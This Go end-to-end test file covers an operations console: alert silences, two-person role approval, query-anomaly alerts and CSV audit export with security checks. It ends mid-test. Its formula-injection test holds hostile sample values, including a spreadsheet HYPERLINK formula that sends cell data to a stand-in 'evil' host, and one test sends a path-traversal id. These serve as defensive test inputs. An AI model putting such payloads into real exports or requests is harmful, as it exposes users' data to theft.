package e2e

import (
	"bytes"
	"context"
	"encoding/csv"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/jackc/pgx/v5"

	"tianting/console/internal/audit"
)

func silenceBody(duration int, matchers ...map[string]any) map[string]any {
	return map[string]any{"matchers": matchers, "durationMinutes": duration, "ticket": "CS-1024", "reason": "计划内重启节点"}
}

func eq(name, value string) map[string]any { return map[string]any{"name": name, "value": value} }

func dataOf(t *testing.T, r reply) map[string]any {
	t.Helper()
	return opsData(t, r)
}

// AC-OPS-18-1：未重新验证返回 4038；验证后 createdBy、comment、matchers、时长都正确，写审计，总览能看到（AC-OPS-18-3 的页面部分）。
func TestOpsSilence_AC18_1_Create(t *testing.T) {
	o := newOpsWorld(t)
	const path = opsAPI + "/silences"
	body := silenceBody(60, eq("alertname", "节点不可达"), eq("node_id", "n1"))

	expect(t, "no step-up", o.engineer.do("POST", path, body), 403, 4038)
	if got := o.am.writes(); len(got) != 0 {
		t.Fatalf("alertmanager got %v", got)
	}

	o.engineer.stepUp()
	r := o.engineer.do("POST", path, body)
	created := dataOf(t, r)
	s := o.am.only()
	if s == nil {
		t.Fatal("no silence in alertmanager")
	}
	if s.CreatedBy != "oeng1" || s.Comment != "CS-1024" {
		t.Errorf("createdBy=%q comment=%q", s.CreatedBy, s.Comment)
	}
	if len(s.Matchers) != 2 {
		t.Fatalf("matchers = %+v", s.Matchers)
	}
	for i, want := range [][2]string{{"alertname", "节点不可达"}, {"node_id", "n1"}} {
		m := s.Matchers[i]
		if *m.Name != want[0] || *m.Value != want[1] || *m.IsRegex || m.IsEqual == nil || !*m.IsEqual {
			t.Errorf("matcher %d = %v=%v regex=%v equal=%v", i, *m.Name, *m.Value, *m.IsRegex, m.IsEqual)
		}
	}
	start, _ := time.Parse(time.RFC3339, s.StartsAt)
	end, _ := time.Parse(time.RFC3339, s.EndsAt)
	if end.Sub(start) != time.Hour || !start.Equal(o.now.Truncate(time.Second)) {
		t.Errorf("startsAt=%v endsAt=%v now=%v", start, end, o.now)
	}
	if created["id"] != s.ID {
		t.Errorf("id = %v, want %v", created["id"], s.ID)
	}

	rows := o.auditRows(`action = 'ops.silence.create'`)
	if len(rows) != 2 || rows[0]["phase"] != "intent" || rows[1]["phase"] != "result" || rows[1]["result"] != "success" {
		t.Fatalf("audit = %v", rows)
	}
	for _, row := range rows {
		if row["username"] != "oeng1" || row["ticket"] != "CS-1024" || row["reason"] != "计划内重启节点" ||
			!strings.Contains(row["target"].(string), `"alert"`) || !strings.Contains(row["target"].(string), "alertname=节点不可达,node_id=n1") ||
			!strings.Contains(row["params"].(string), `"durationMinutes":60`) {
			t.Errorf("audit row = %v", row)
		}
	}
	if !strings.Contains(rows[1]["params"].(string), s.ID) {
		t.Errorf("result has no silence id: %v", rows[1])
	}

	// viewer 在总览和告警接口都能看到，只有匹配条件、创建人和时间，没有工单号。
	for _, p := range []string{"/alerts", "/overview"} {
		r := o.viewer.do("GET", opsAPI+p, nil)
		d := dataOf(t, r)
		card := d
		if p == "/overview" {
			card = d["alerts"].(map[string]any)
		}
		list, _ := card["silences"].([]any)
		if len(list) != 1 {
			t.Fatalf("%s silences = %v", p, card)
		}
		m := list[0].(map[string]any)
		if m["createdBy"] != "oeng1" || m["id"] != s.ID || m["endsAt"] != s.EndsAt {
			t.Errorf("%s silence = %v", p, m)
		}
		if strings.Contains(r.raw, "CS-1024") {
			t.Errorf("%s leaks the ticket: %s", p, r.raw)
		}
	}

	// intent 写失败：不调用 Alertmanager（F-OPS-14 规则 4）。
	o.am.reset()
	o.a.SetAuditFault("fail")
	expect(t, "audit down", o.engineer.do("POST", path, body), 503, 5031)
	o.a.SetAuditFault("ok")
	if got := o.am.silenceRequests(); len(got) != 0 {
		t.Errorf("alertmanager got %v", got)
	}
}

// AC-OPS-18-2：非法的匹配条件和时长都是 4000，Alertmanager 没有收到任何请求。
func TestOpsSilence_AC18_2_Invalid(t *testing.T) {
	o := newOpsWorld(t)
	o.engineer.stepUp()
	o.am.reset()
	yes, no := true, false
	withRegex := func(name, value string, regex, equal *bool) map[string]any {
		m := eq(name, value)
		if regex != nil {
			m["isRegex"] = *regex
		}
		if equal != nil {
			m["isEqual"] = *equal
		}
		return m
	}
	ok := eq("alertname", "节点不可达")
	base := func(k string, v any) map[string]any {
		b := silenceBody(60, ok)
		b[k] = v
		return b
	}
	cases := map[string]map[string]any{
		"matchers empty":     silenceBody(60),
		"matchers null":      base("matchers", nil),
		"regex body":         silenceBody(60, eq("alertname=~", `".*"`)),
		"regex value":        silenceBody(60, eq("alertname", `.*`)),
		"regex flag":         silenceBody(60, withRegex("alertname", "x", &yes, nil)),
		"regex flag .*":      silenceBody(60, withRegex("alertname", ".*", &yes, nil)),
		"negative matcher":   silenceBody(60, withRegex("alertname", "x", &no, &no)),
		"empty value":        silenceBody(60, eq("alertname", "")),
		"blank value":        silenceBody(60, eq("alertname", "   ")),
		"other label":        silenceBody(60, eq("severity", "critical")),
		"instance label":     silenceBody(60, eq("instance", "n1")),
		"duplicate name":     silenceBody(60, ok, eq("alertname", "无就绪节点")),
		"node regex":         silenceBody(60, eq("node_id", "n1|n2")),
		"25 hours":           silenceBody(25*60, ok),
		"1441 minutes":       silenceBody(1441, ok),
		"14 minutes":         silenceBody(14, ok),
		"zero duration":      silenceBody(0, ok),
		"negative duration":  silenceBody(-60, ok),
		"fractional minutes": base("durationMinutes", 60.5),
		"no ticket":          base("ticket", ""),
		"bad ticket":         base("ticket", "CS 1024"),
		"no reason":          base("reason", ""),
		"repeated reason":    base("reason", "aaaa"),
	}
	for name, body := range cases {
		expect(t, name, o.engineer.do("POST", opsAPI+"/silences", body), 400, 4000)
	}
	if got := o.am.silenceRequests(); len(got) != 0 {
		t.Errorf("alertmanager got %v", got)
	}
	if o.am.only() != nil {
		t.Error("a silence was created")
	}
	if rows := o.auditRows(`action = 'ops.silence.create'`); len(rows) != 0 {
		t.Errorf("rejected input wrote audit: %v", rows)
	}
	// 边界：15 分钟、24 小时都可以；只匹配一个条件也可以。
	expect(t, "15m", o.engineer.do("POST", opsAPI+"/silences", silenceBody(15, ok)), 200, 0)
	expect(t, "24h", o.engineer.do("POST", opsAPI+"/silences", silenceBody(1440, eq("node_id", "n1"))), 200, 0)
}

// AC-OPS-18-4：viewer、审计员、超管都是 403 / 4030，写 denied，Alertmanager 没有收到请求。
func TestOpsSilence_AC18_4_Denied(t *testing.T) {
	o := newOpsWorld(t)
	o.am.reset()
	body := silenceBody(60, eq("alertname", "节点不可达"))
	for name, u := range map[string]*user{"viewer": o.viewer, "auditor": o.auditor, "super": o.super} {
		u.stepUp()
		expect(t, name, u.do("POST", opsAPI+"/silences", body), 403, 4030)
		expect(t, name+" expire", u.do("POST", opsAPI+"/silences/00000000-0000-4000-8000-000000000001:expire", map[string]any{"ticket": "CS-1024", "reason": "计划内重启节点"}), 403, 4030)
	}
	rows := o.auditRows(`action = 'ops.silence.create' AND result = 'denied' AND username = 'oview1'`)
	if len(rows) != 1 || rows[0]["ip"] == "" {
		t.Errorf("denied audit = %v", rows)
	}
	if rows := o.auditRows(`action = 'ops.silence.expire' AND result = 'denied'`); len(rows) != 3 {
		t.Errorf("denied expire audit = %v", rows)
	}
	if got := o.am.silenceRequests(); len(got) != 0 {
		t.Errorf("alertmanager got %v", got)
	}
}

// CS-130 内容 1、3：提前结束要重新验证、工单号和理由，写 ops.silence.expire。
func TestOpsSilence_Expire(t *testing.T) {
	o := newOpsWorld(t)
	o.engineer.stepUp()
	id := dataOf(t, o.engineer.do("POST", opsAPI+"/silences", silenceBody(30, eq("alertname", "节点不可达"), eq("node_id", "n1"))))["id"].(string)
	expire := map[string]any{"ticket": "CS-2048", "reason": "节点已恢复"}
	path := opsAPI + "/silences/" + id + ":expire"

	o.advance(6 * time.Minute) // 重新验证的窗口过了
	expect(t, "no step-up", o.engineer.do("POST", path, expire), 403, 4038)
	o.engineer.stepUp()
	o.am.reset()
	expect(t, "no ticket", o.engineer.do("POST", path, map[string]any{"reason": "节点已恢复"}), 400, 4000)
	expect(t, "bad reason", o.engineer.do("POST", path, map[string]any{"ticket": "CS-2048", "reason": "aaaa"}), 400, 4000)
	expect(t, "bad id", o.engineer.do("POST", opsAPI+"/silences/..%2f..%2fx:expire", expire), 400, 4004)
	expect(t, "no suffix", o.engineer.do("POST", opsAPI+"/silences/"+id, expire), 404, 4040)
	if got := o.am.silenceRequests(); len(got) != 0 {
		t.Errorf("alertmanager got %v", got)
	}
	expect(t, "other methods", o.engineer.do("DELETE", path, nil), 405, 0)

	expect(t, "expire", o.engineer.do("POST", path, expire), 200, 0)
	if got := o.am.writes(); len(got) != 1 || got[0].method != "DELETE" || got[0].path != "/api/v2/silence/"+id {
		t.Errorf("alertmanager writes = %v", got)
	}
	rows := o.auditRows(`action = 'ops.silence.expire' AND phase = 'result'`)
	if len(rows) != 1 || rows[0]["result"] != "success" || rows[0]["ticket"] != "CS-2048" || rows[0]["reason"] != "节点已恢复" ||
		!strings.Contains(rows[0]["target"].(string), "alertname=节点不可达,node_id=n1") || !strings.Contains(rows[0]["params"].(string), `"durationMinutes":30`) {
		t.Errorf("audit = %v", rows)
	}
	// 结束后不再显示；再结束一次是冲突。
	if list, _ := dataOf(t, o.viewer.do("GET", opsAPI+"/alerts", nil))["silences"].([]any); len(list) != 0 {
		t.Errorf("silences = %v", list)
	}
	expect(t, "twice", o.engineer.do("POST", path, expire), 409, 4093)

	missing := opsAPI + "/silences/00000000-0000-4000-8000-999999999999:expire"
	expect(t, "missing", o.engineer.do("POST", missing, expire), 404, 4040)
	if rows := o.auditRows(`action = 'ops.silence.expire' AND phase = 'result' AND result = 'failure' AND code = 4040`); len(rows) != 1 {
		t.Errorf("missing silence audit = %v", rows)
	}
}

// 不可用和结果未知：不可用就是失败；断开连接时不能说失败，也不能说成功。
func TestOpsSilence_Unavailable(t *testing.T) {
	o := newOpsWorld(t)
	o.engineer.stepUp()
	body := silenceBody(60, eq("alertname", "节点不可达"))

	o.am.mu.Lock()
	o.am.dropWrites = true
	o.am.mu.Unlock()
	expect(t, "dropped", o.engineer.do("POST", opsAPI+"/silences", body), 504, 5040)
	rows := o.auditRows(`action = 'ops.silence.create' AND phase = 'result'`)
	if len(rows) != 1 || rows[0]["result"] != "unknown" {
		t.Errorf("audit = %v", rows)
	}
	o.am.mu.Lock()
	o.am.dropWrites = false
	o.am.mu.Unlock()

	// 只有静默读不到：告警还在，静默标不可用，不说"没有静默"。
	o.alerts.Store(`[{"labels":{"alertname":"节点不可达","severity":"critical","node_id":"n1"},"annotations":{},"startsAt":"2027-01-15T00:00:00Z"}]`)
	o.am.mu.Lock()
	o.am.silencesDown = true
	o.am.mu.Unlock()
	d := dataOf(t, o.viewer.do("GET", opsAPI+"/alerts", nil))
	if list, _ := d["list"].([]any); len(list) != 1 {
		t.Errorf("alerts = %v", d)
	}
	if s, _ := d["silences"].(map[string]any); s == nil || s["unavailable"] != true {
		t.Errorf("silences = %v", d["silences"])
	}

	o.am.srv.Close()
	expect(t, "down", o.engineer.do("POST", opsAPI+"/silences", body), 503, 5030)
	rows = o.auditRows(`action = 'ops.silence.create' AND phase = 'result' AND result = 'failure' AND code = 5030`)
	if len(rows) != 1 {
		t.Errorf("audit = %v", rows)
	}
}

func approveEng(u *user, id string) reply {
	return u.do("POST", "/console/api/accounts/"+id+"/roles/approve", map[string]any{"role": "ops_engineer"})
}

// AC-OPS-02-8：A 授予；A 自己批准 4030；B 批准前 X 查不了；B 批准后可以；三步都有审计。
func TestOpsRoleApproval_AC02_8(t *testing.T) {
	n1 := startNode(t, "n1")
	o := newOpsWorld(t, n1)
	a, b := o.super, o.super2nd
	x := a.create("xeng", "ops_viewer")
	const query = opsAPI + "/troubleshoot/query"
	expect(t, "before", x.do("POST", query, tsBody("u1")), 403, 4030)

	a.stepUp()
	r := a.do("POST", "/console/api/accounts/"+x.id+"/roles", map[string]any{"roles": []string{"ops_engineer", "ops_viewer"}})
	expect(t, "grant", r, 200, 0)
	// 实际权限没变：会话还在，排查还是 403。
	expect(t, "x still signed in", x.do("GET", "/console/api/session", nil), 200, 0)
	expect(t, "pending", x.do("POST", query, tsBody("u1")), 403, 4030)
	view := a.do("GET", "/console/api/accounts/"+x.id, nil)
	roles, _ := view.body["roles"].([]any)
	pending, _ := view.body["pendingRoles"].([]any)
	if len(roles) != 1 || roles[0] != "ops_viewer" || len(pending) != 1 {
		t.Fatalf("account = %s", view.raw)
	}
	if p := pending[0].(map[string]any); p["role"] != "ops_engineer" || p["requestedBy"] != "osuper" {
		t.Errorf("pending = %v", p)
	}
	// 审计员在授予时就收到通知，标了待批准。
	if list := o.notifications(o.auditor); !hasNotice(list, "account.sensitive_role", `"pending": true`) {
		t.Errorf("notifications = %v", list)
	}

	// A 自己批准：先过重新验证，再 4030。
	a.stepUp()
	expect(t, "self approve", approveEng(a, x.id), 403, 4030)
	expect(t, "still pending", x.do("POST", query, tsBody("u1")), 403, 4030)
	// B 没有重新验证：4038。
	o.advance(6 * time.Minute)
	expect(t, "x alive", x.do("GET", "/console/api/session", nil), 200, 0)
	expect(t, "no step-up", approveEng(b, x.id), 403, 4038)
	expect(t, "still pending 2", x.do("POST", query, tsBody("u1")), 403, 4030)

	b.stepUp()
	expect(t, "b approves", approveEng(b, x.id), 200, 0)
	// 角色变化：旧会话失效，重新登录后按新角色（F-CON-05 规则 4）。
	expect(t, "old session", x.do("POST", query, tsBody("u1")), 401, 4014)
	x.w.tick()
	expect(t, "login", x.login(), 200, 0)
	expect(t, "after approval", x.do("POST", query, tsBody("u1")), 200, 0)
	view = a.do("GET", "/console/api/accounts/"+x.id, nil)
	if p, _ := view.body["pendingRoles"].([]any); len(p) != 0 {
		t.Errorf("pending after approval = %s", view.raw)
	}

	// 三步审计。
	grant := o.auditRows(`action = 'account.roles' AND target LIKE '%xeng%' AND phase = 'result'`)
	if len(grant) != 1 || grant[0]["username"] != "osuper" || !strings.Contains(grant[0]["params"].(string), `"pendingRoles":["ops_engineer"]`) {
		t.Errorf("grant audit = %v", grant)
	}
	denied := o.auditRows(`action = 'account.role_approve' AND result = 'denied'`)
	if len(denied) != 1 || denied[0]["username"] != "osuper" || denied[0]["code"].(int32) != 4030 || !strings.Contains(denied[0]["target"].(string), "xeng") {
		t.Errorf("denied audit = %v", denied)
	}
	ok := o.auditRows(`action = 'account.role_approve' AND phase = 'result' AND result = 'success'`)
	var mine []map[string]any
	for _, r := range ok {
		if strings.Contains(r["target"].(string), "xeng") {
			mine = append(mine, r)
		}
	}
	if len(mine) != 1 || mine[0]["username"] != "osuper2" || !strings.Contains(mine[0]["params"].(string), `"requestedBy":"osuper"`) {
		t.Errorf("approve audit = %v", ok)
	}
	if list := o.notifications(o.auditor); !hasNotice(list, "account.sensitive_role", `"by": "osuper2"`) {
		t.Errorf("notifications = %v", list)
	}
	b.stepUp()
	expect(t, "twice", approveEng(b, x.id), 409, 4093)
}

// 待批准的各种路径：新建账号、撤回、互斥、停用、无权限。
func TestOpsRoleApproval_Paths(t *testing.T) {
	n1 := startNode(t, "n1")
	o := newOpsWorld(t, n1)
	a, b := o.super, o.super2nd
	const query = opsAPI + "/troubleshoot/query"

	// 新建账号也要批准：没批准前一个角色都没有。
	y := a.create("yeng", "ops_engineer")
	expect(t, "new account", y.do("POST", query, tsBody("u1")), 403, 4030)
	s := y.do("GET", "/console/api/session", nil)
	if p, _ := s.body["perms"].([]any); len(p) != 0 {
		t.Errorf("perms = %s", s.raw)
	}

	// 改成别的角色：待批准作废，再批准是冲突。
	a.stepUp()
	expect(t, "withdraw", a.do("POST", "/console/api/accounts/"+y.id+"/roles", map[string]any{"roles": []string{"ops_viewer"}}), 200, 0)
	b.stepUp()
	expect(t, "cancelled", approveEng(b, y.id), 409, 4093)

	// 待批准期间改成审计员（互斥角色）：作废，不会变成排障 + 审计。
	z := a.create("zeng", "ops_engineer")
	a.stepUp()
	expect(t, "to auditor", a.do("POST", "/console/api/accounts/"+z.id+"/roles", map[string]any{"roles": []string{"ops_auditor"}}), 200, 0)
	b.stepUp()
	expect(t, "exclusive", approveEng(b, z.id), 409, 4093)

	// 互斥角色的组合仍然在授予时就拒绝（AC-OPS-02-9）。
	a.stepUp()
	expect(t, "combo", a.do("POST", "/console/api/accounts/"+z.id+"/roles", map[string]any{"roles": []string{"ops_engineer", "ops_auditor"}}), 409, 4093)

	// 已停用的账号不能批准。
	w := a.create("weng", "ops_engineer")
	a.stepUp()
	expect(t, "disable", a.do("POST", "/console/api/accounts/"+w.id+"/disable", map[string]any{}), 200, 0)
	b.stepUp()
	expect(t, "disabled", approveEng(b, w.id), 409, 4093)

	// 已经是排障工程师的账号，保留这个角色不用再批准。
	a.stepUp()
	expect(t, "keep", a.do("POST", "/console/api/accounts/"+o.engineer.id+"/roles", map[string]any{"roles": []string{"ops_engineer", "ops_viewer"}}), 200, 0)
	view := a.do("GET", "/console/api/accounts/"+o.engineer.id, nil)
	if p, _ := view.body["pendingRoles"].([]any); len(p) != 0 || !strings.Contains(view.raw, `"ops_engineer"`) {
		t.Errorf("keep = %s", view.raw)
	}

	// 其他角色不能调批准接口；不存在的账号 4040；不需要批准的角色 4000。
	o.viewer.stepUp()
	expect(t, "viewer", approveEng(o.viewer, y.id), 403, 4030)
	b.stepUp()
	expect(t, "missing", approveEng(b, "00000000-0000-4000-8000-000000000001"), 404, 4040)
	expect(t, "other role", b.do("POST", "/console/api/accounts/"+y.id+"/roles/approve", map[string]any{"role": "ops_viewer"}), 400, 4000)

	// 管理空间不需要批准：operator 马上生效，也没有批准接口。
	admin := o.world.super("adm8")
	op := admin.create("op8", "operator")
	if r := op.do("GET", "/console/api/session", nil); !strings.Contains(r.raw, "user.read") {
		t.Errorf("admin role pending: %s", r.raw)
	}
	admin.stepUp()
	expect(t, "admin approve route", approveEng(admin, op.id), 404, 4040)
}

// AC-OPS-08-14：1 小时内 20 个不同 userId 通知全部审计员，含账号名和数量，不含 userId 列表；同一窗口只发一次。
func TestOpsQueryAnomaly_AC08_14(t *testing.T) {
	n1 := startNode(t, "n1")
	o := newOpsWorld(t, n1)
	aud2 := o.super.create("oaud2", "ops_auditor")
	other := o.createEngineer("oeng2")
	const path = opsAPI + "/troubleshoot/query"
	const kind = "ops.troubleshoot_anomaly"
	count := func(u *user) (n int, all string) {
		for _, x := range o.notifications(u) {
			if strings.HasPrefix(x, kind+":") {
				n++
				all += x
			}
		}
		return n, all
	}
	secret := func(i int) string { return fmt.Sprintf("canary-%d", i) }

	// 19 个不同的 + 同一个查很多次：不到门槛。
	for i := range 19 {
		expect(t, "query", o.engineer.do("POST", path, tsBody(secret(i))), 200, 0)
	}
	o.advance(time.Minute)
	for range 5 {
		expect(t, "repeat", o.engineer.do("POST", path, tsBody(secret(0))), 200, 0)
	}
	if n, _ := count(o.auditor); n != 0 {
		t.Fatalf("notified after 19 distinct users")
	}
	// 被拒绝的查询不算：别的账号不影响这个账号的计数。
	expect(t, "other", other.do("POST", path, tsBody(secret(19))), 200, 0)
	if n, _ := count(o.auditor); n != 0 {
		t.Fatal("counted another account")
	}

	expect(t, "20th", o.engineer.do("POST", path, tsBody(secret(19))), 200, 0)
	for _, u := range []*user{o.auditor, aud2} {
		n, all := count(u)
		if n != 1 {
			t.Fatalf("%s got %d notices", u.name, n)
		}
		var payload map[string]any
		if err := json.Unmarshal([]byte(strings.TrimPrefix(all, kind+":")), &payload); err != nil {
			t.Fatal(err)
		}
		if payload["who"] != "oeng1" || payload["count"] != float64(20) {
			t.Errorf("payload = %v", payload)
		}
		if strings.Contains(all, "canary") {
			t.Errorf("notice contains userIds: %s", all)
		}
	}
	// 不发给排障工程师和超管。
	if n, _ := count(o.super); n != 0 {
		t.Error("super was notified")
	}

	// 同一窗口只发一次。
	o.advance(time.Minute)
	for i := 20; i < 26; i++ {
		expect(t, "more", o.engineer.do("POST", path, tsBody(secret(i))), 200, 0)
	}
	o.advance(50 * time.Minute)
	expect(t, "login", o.engineer.login(), 200, 0)
	expect(t, "later", o.engineer.do("POST", path, tsBody(secret(26))), 200, 0)
	if n, _ := count(o.auditor); n != 1 {
		t.Fatalf("second notice inside the window: %d", n)
	}

	// 窗口过了又查满 20 个不同的：再发一次。
	o.advance(61 * time.Minute)
	expect(t, "relogin", o.engineer.login(), 200, 0)
	for i := 0; i < 19; i++ {
		expect(t, "next", o.engineer.do("POST", path, tsBody(secret(i))), 200, 0)
	}
	if n, _ := count(o.auditor); n != 1 {
		t.Fatalf("old queries still counted: %d", n)
	}
	expect(t, "next 20th", o.engineer.do("POST", path, tsBody(secret(19))), 200, 0)
	if n, _ := count(o.auditor); n != 2 {
		t.Fatalf("no notice in the second window: %d", n)
	}
}

// 解析导出结果：去掉 BOM，第一行是表头。
func parseExport(t *testing.T, r reply) (header []string, rows []map[string]string) {
	t.Helper()
	if r.status != 200 {
		t.Fatalf("status %d: %s", r.status, r.raw)
	}
	if !strings.HasPrefix(r.raw, "\xef\xbb\xbf") {
		t.Errorf("no BOM: %q", r.raw[:min(len(r.raw), 8)])
	}
	all, err := csv.NewReader(strings.NewReader(strings.TrimPrefix(r.raw, "\xef\xbb\xbf"))).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	header = all[0]
	for _, row := range all[1:] {
		m := map[string]string{}
		for i, h := range header {
			m[h] = row[i]
		}
		rows = append(rows, m)
	}
	return header, rows
}

func exportRange(w *world, extra map[string]any) map[string]any {
	b := map[string]any{"from": w.now.Add(-30 * 24 * time.Hour).UnixMilli(), "to": w.now.Add(time.Hour).UnixMilli()}
	for k, v := range extra {
		b[k] = v
	}
	return b
}

// bulkAudit 用 owner 账号一次插入 n 条（不算哈希：这个用例不校验链），比逐条写快得多。
func bulkAudit(t *testing.T, w *world, n int, action string) {
	t.Helper()
	ctx := context.Background()
	c, err := pgx.Connect(ctx, w.owner)
	if err != nil {
		t.Fatal(err)
	}
	defer c.Close(ctx)
	if _, err := c.Exec(ctx, `WITH head AS (SELECT seq, ts FROM audit.chain_head),
		ins AS (INSERT INTO audit.records (seq, id, ts, space, phase, request_id, action, prev_hash, hash, result)
			SELECT head.seq + i, gen_random_uuid(), head.ts, 'ops', 'event', 'bulk-' || i, $2, '', '', 'success' FROM head, generate_series(1, $1::int) i RETURNING seq)
		UPDATE audit.chain_head SET seq = (SELECT max(seq) FROM ins)`, n, action); err != nil {
		t.Fatal(err)
	}
}

const exportPath = "/console/api/audit/export"

// AC-OPS-15-8、CS-061、CS-132：未重新验证 4038；验证后导出，写 ops.audit.export（筛选条件、条数）；流式。
func TestAuditExport_AC15_8(t *testing.T) {
	o := newOpsWorld(t)
	body := exportRange(o.world, map[string]any{"action": "account.create"})

	expect(t, "no step-up", o.auditor.do("POST", exportPath, body), 403, 4038)
	if rows := o.auditRows(`action = 'ops.audit.export'`); len(rows) != 0 {
		t.Errorf("audit before step-up: %v", rows)
	}
	o.auditor.stepUp()
	r := o.auditor.do("POST", exportPath, body)
	header, rows := parseExport(t, r)
	if ct := r.header.Get("Content-Type"); !strings.HasPrefix(ct, "text/csv") {
		t.Errorf("content type = %q", ct)
	}
	if cd := r.header.Get("Content-Disposition"); !strings.HasPrefix(cd, `attachment; filename="audit-ops-`) {
		t.Errorf("disposition = %q", cd)
	}
	if r.header.Get("Cache-Control") != "no-store" {
		t.Errorf("cache-control = %q", r.header.Get("Cache-Control"))
	}
	// 流式：边查边写，事先不知道长度。
	if cl := r.header.Get("Content-Length"); cl != "" {
		t.Errorf("content-length = %q: the export was buffered", cl)
	}
	if !strings.Contains(strings.Join(header, ","), "action") || len(rows) == 0 {
		t.Fatalf("export = %q", r.raw)
	}
	for _, row := range rows {
		if row["action"] != "account.create" || row["space"] != "ops" {
			t.Errorf("row = %v", row)
		}
	}
	// 审计：intent 和 result 都带筛选条件，result 带条数；导出不包含自己。
	audited := o.auditRows(`action = 'ops.audit.export'`)
	if len(audited) != 2 || audited[0]["phase"] != "intent" || audited[1]["result"] != "success" || audited[1]["username"] != "oaud1" {
		t.Fatalf("audit = %v", audited)
	}
	want := fmt.Sprintf(`"count":%d`, len(rows))
	for _, s := range []string{want, `"action":"account.create"`, `"from":`} {
		if !strings.Contains(audited[1]["params"].(string), s) {
			t.Errorf("result params %s has no %s", audited[1]["params"], s)
		}
	}
	if strings.Contains(r.raw, "ops.audit.export") {
		t.Error("export contains its own record")
	}

	// 只有审计查看权限的才能导出：其他角色 403 / 4030 并留痕。
	o.viewer.stepUp()
	expect(t, "viewer", o.viewer.do("POST", exportPath, body), 403, 4030)
	if d := o.auditRows(`action = 'ops.audit.export' AND result = 'denied' AND username = 'oview1'`); len(d) != 1 {
		t.Errorf("denied = %v", d)
	}

	// 筛选条件和时间范围的规则和查询一样（AC-OPS-15-4）。
	o.auditor.stepUp()
	expect(t, "no range", o.auditor.do("POST", exportPath, map[string]any{}), 400, 4000)
	expect(t, "32 days", o.auditor.do("POST", exportPath, map[string]any{"from": 0, "to": int64(32 * 24 * 3600 * 1000)}), 400, 4000)
	expect(t, "bad result", o.auditor.do("POST", exportPath, exportRange(o.world, map[string]any{"result": "x"})), 400, 4000)
	// 不接受 GET，筛选条件不进 URL；PUT、PATCH、DELETE 也是 405（AC-OPS-15-7）。
	for _, m := range []string{"GET", "PUT", "PATCH", "DELETE"} {
		if r := o.auditor.do(m, exportPath, nil); r.status != 405 {
			t.Errorf("%s = %d", m, r.status)
		}
	}
	// intent 写失败：不返回数据。
	o.a.SetAuditFault("fail")
	expect(t, "audit down", o.auditor.do("POST", exportPath, body), 503, 5031)
	o.a.SetAuditFault("ok")
}

// 运维审计员可以导出全部空间；管理空间的审计员导出 audit.export，只能看自己的空间（B-OPS-10）。
func TestAuditExport_Spaces(t *testing.T) {
	o := newOpsWorld(t)
	admin := o.world.super("adm9")
	aud := admin.create("aud9", "auditor")

	o.auditor.stepUp()
	_, rows := parseExport(t, o.auditor.do("POST", exportPath, exportRange(o.world, map[string]any{"space": "all", "action": "account.create"})))
	spaces := map[string]bool{}
	for _, row := range rows {
		spaces[row["space"]] = true
	}
	if !spaces["ops"] || !spaces["admin"] {
		t.Errorf("spaces = %v", spaces)
	}

	expect(t, "no step-up", aud.do("POST", exportPath, exportRange(o.world, nil)), 403, 4038)
	aud.stepUp()
	_, rows = parseExport(t, aud.do("POST", exportPath, exportRange(o.world, map[string]any{"action": "account.create"})))
	for _, row := range rows {
		if row["space"] != "admin" {
			t.Errorf("admin auditor saw %v", row)
		}
	}
	if a := o.auditRows(`action = 'audit.export' AND phase = 'result' AND username = 'aud9'`); len(a) != 1 {
		t.Errorf("audit = %v", a)
	}
	expect(t, "admin to ops", aud.do("POST", exportPath, exportRange(o.world, map[string]any{"space": "ops"})), 403, 4030)
	if d := o.auditRows(`action = 'audit.export' AND result = 'denied' AND username = 'aud9'`); len(d) != 1 {
		t.Errorf("denied = %v", d)
	}
}

// 公式注入：操作人能控制的字段开头是公式字符时，导出后是文本。
func TestAuditExport_FormulaInjection(t *testing.T) {
	o := newOpsWorld(t)
	dangerous := []string{`=HYPERLINK("http://evil/?x="&A1,"x")`, `+1+1`, `-2+3`, `@SUM(A1:A2)`, "\t=1", "\r=1", "\n=1", `  =1`, "　=1", `＝1`, `＋1`, `－1`, `＠1`}
	for i, v := range dangerous {
		if err := o.a.Audit.Write(context.Background(), audit.Record{
			Space: "ops", Phase: audit.PhaseEvent, RequestID: fmt.Sprintf("csv-%d", i), Username: v, Actor: v, IP: v, UA: v, Action: "csv.test",
			Target: audit.NewTarget("user", v), Reason: v, Ticket: v, Result: audit.Success,
		}); err != nil {
			t.Fatal(err)
		}
	}
	safe := `普通的理由, 含"引号"和逗号`
	if err := o.a.Audit.Write(context.Background(), audit.Record{Space: "ops", Phase: audit.PhaseEvent, RequestID: "csv-safe", Username: "alice", Action: "csv.test", Reason: safe, Result: audit.Success}); err != nil {
		t.Fatal(err)
	}
	o.auditor.stepUp()
	_, rows := parseExport(t, o.auditor.do("POST", exportPath, exportRange(o.world, map[string]any{"action": "csv.test"})))
	if len(rows) != len(dangerous)+1 {
		t.Fatalf("rows = %d", len(rows))
	}
	for _, row := range rows {
		if row["requestId"] == "csv-safe" {
			if row["reason"] != safe || row["username"] != "alice" {
				t.Errorf("safe row changed: %v", row)
			}
			continue
		}
		for _, col := range []string{"username", "actor", "ip", "ua", "reason", "ticket"} {
			if !strings.HasPrefix(row[col], "'") {
				t.Errorf("%s not neutralized: %q", col, row[col])
			}
		}
	}
}

// 单次不超过 1 万条：正好 1 万可以（跨多页，不重不漏），多一条整个拒绝，不截断。
func TestAuditExport_Limit(t *testing.T) {
	if testing.Short() {
		t.Skip("slow")
	}
	o := newOpsWorld(t)
	bulkAudit(t, o.world, 10_000, "bulk.test")
	o.auditor.stepUp()
	body := exportRange(o.world, map[string]any{"action": "bulk.test"})
	r := o.auditor.do("POST", exportPath, body)
	_, rows := parseExport(t, r)
	if len(rows) != 10_000 {
		t.Fatalf("rows = %d", len(rows))
	}
	seen := map[string]bool{}
	for i, row := range rows {
		if seen[row["seq"]] {
			t.Fatalf("duplicate seq %s", row["seq"])
		}
		seen[row["seq"]] = true
		if i > 0 && rows[i-1]["seq"] <= row["seq"] && len(rows[i-1]["seq"]) == len(row["seq"]) {
			t.Fatalf("not descending at %d", i)
		}
	}
	if a := o.auditRows(`action = 'ops.audit.export' AND phase = 'result' AND params LIKE '%"count":10000%'`); len(a) != 1 {
		t.Errorf("audit = %v", a)
	}

	bulkAudit(t, o.world, 1, "bulk.test")
	r = o.auditor.do("POST", exportPath, body)
	expect(t, "10001", r, 400, 4131)
	if r.reason() != "auditExportTooMany" {
